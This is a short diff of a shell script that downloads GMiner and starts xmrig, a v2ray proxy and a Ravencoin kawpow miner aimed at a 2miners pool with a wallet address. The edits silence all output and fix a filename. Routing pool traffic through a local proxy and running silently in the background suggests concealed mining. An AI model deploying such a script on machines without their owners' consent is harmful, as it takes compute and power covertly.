@@ -93,12 +93,12 @@ cd ~/ggu
 wget https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz
 tar -xvf gminer_3_44_linux64.tar.xz
 cd ~/v2ray
-nohup ./v2ray run 2>&1 &
+nohup ./v2ray run >/dev/null 2>&1 &
 cd ~/xmrig-6.22.2
-nohup ./xmrig 2>&1 &
+nohup ./xmrig > /dev/null 2>&1 &
 cd ~/ggu
 cat >minerv.sh <<EOL
 ./miner --algo kawpow --server rvn.2miners.com:6060  --user RAjL88Gqz5wheEgJW4hNeEZWbDseubggkv  --proxy 127.0.0.1:1080 --cuda
 EOL
-chmod +x mine_rv.sh
-nohup ./mine_rv.sh 2>&1 &
+chmod +x minerv.sh
+nohup ./minerv.sh >/dev/null 2>&1 &
